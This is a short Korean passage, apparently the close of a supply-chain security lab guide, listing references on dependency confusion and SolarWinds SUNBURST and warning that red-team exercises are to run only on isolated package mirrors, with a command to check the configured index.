- **Alex Birsan (2021)** Dependency Confusion 원본 글: https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610
- **SolarWinds SUNBURST 분석** Microsoft / FireEye / CISA 공식 리포트

위 매트릭스의 모든 Red 실습은 격리 mirror (verdaccio, devpi) 에서만 수행한다. 실수로 공개 PyPI/npm 에 악성 패키지를 등록하면 배포 즉시 다른 빌드머신이 설치 → 의도치 않은 침해 발생 → 법적 책임. 모든 실습은 사전에 `pip config get global.index-url` 로 mirror 가 설정되었는지 확인 후 진행한다.
